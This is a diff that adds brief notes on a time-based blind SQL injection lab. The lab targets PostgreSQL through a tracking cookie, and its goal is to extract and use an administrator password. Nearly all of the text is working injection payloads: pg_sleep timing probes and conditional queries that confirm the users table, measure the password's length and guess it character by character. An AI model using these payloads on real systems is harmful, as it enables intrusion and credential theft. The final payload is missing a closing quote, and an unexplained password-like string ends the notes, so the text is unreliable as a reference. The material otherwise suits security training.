@@ -1,0 +1,32 @@
+Blind SQL injection with time delays and information retrieval
+
+vulnerable parameter: tracking cookie
+
+End Goal: 
+
+1. exploit the time based blind SQLi to output thea administrator password.
+2. login as adminstrator user.
+
+Analysis:
+
+1. Confirm thst the parameter is vulnerable to time based blind SQLi.
+
+' || pg_sleep(10)-- -> it is PGSQL Database 
+
+2. Confirm that users table exists in Database.
+
+' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) else pg_sleep(-1) END)--
+
+' || (SELECT CASE WHEN (username = 'administrator') THEN pg_sleep(10) else pg_sleep(-1) END FROM users)--
+
+3. Enumerate the length of password.
+
+' || (SELECT CASE WHEN (username = 'administrator' and LENGTH(password)>25) THEN pg_sleep(10) else pg_sleep(-1) END FROM users)--
+
+-> password length is less than 25.
+
+4. Enumerate administrator password.
+
+' || (SELECT CASE WHEN (username = 'administrator' and substring(password,1,1)='a) THEN pg_sleep(10) else pg_sleep(-1) END FROM users)--
+
+p7gto0anz pxxav8jf9 
